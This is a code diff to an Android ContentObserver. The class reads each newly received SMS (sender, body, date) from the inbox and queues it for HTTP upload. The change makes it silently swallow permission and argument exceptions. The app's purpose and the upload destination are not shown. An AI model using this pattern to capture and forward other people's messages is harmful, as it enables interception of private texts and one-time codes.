@@ -26,25 +26,29 @@ public class SmsContentObserver extends ContentObserver {
     public void onChange(boolean selfChange) {
         super.onChange(selfChange);
         Uri uri = Uri.parse("content://sms/inbox");
-        Cursor cursor = resolver.query(uri, new String[]{"_id","address","body","type","date"}, null, null, "date DESC LIMIT 1");
-        if (cursor != null) {
-            try {
-                if (cursor.moveToFirst()) {
-                    int _id = cursor.getInt(0);
-                    String address = cursor.getString(1);
-                    String body = cursor.getString(2);
-                    int type = cursor.getInt(3);
-                    long date = cursor.getLong(4);
-                    if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) {
-                        if (!recentIds.contains(_id) && _id > ConfigManager.getLastUploadedId(ctx)) {
-                            recentIds.add(_id);
-                            HttpUploader.enqueueUpload(ctx, _id, address, body, type, date);
+        try {
+            Cursor cursor = resolver.query(uri, new String[]{"_id","address","body","type","date"}, null, null, "date DESC");
+            if (cursor != null) {
+                try {
+                    if (cursor.moveToFirst()) {
+                        int _id = cursor.getInt(0);
+                        String address = cursor.getString(1);
+                        String body = cursor.getString(2);
+                        int type = cursor.getInt(3);
+                        long date = cursor.getLong(4);
+                        if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) {
+                            if (!recentIds.contains(_id) && _id > ConfigManager.getLastUploadedId(ctx)) {
+                                recentIds.add(_id);
+                                HttpUploader.enqueueUpload(ctx, _id, address, body, type, date);
+                            }
                         }
                     }
+                } finally {
+                    cursor.close();
                 }
-            } finally {
-                cursor.close();
             }
+        } catch (SecurityException ignored) {
+        } catch (IllegalArgumentException ignored) {
         }
     }
 }
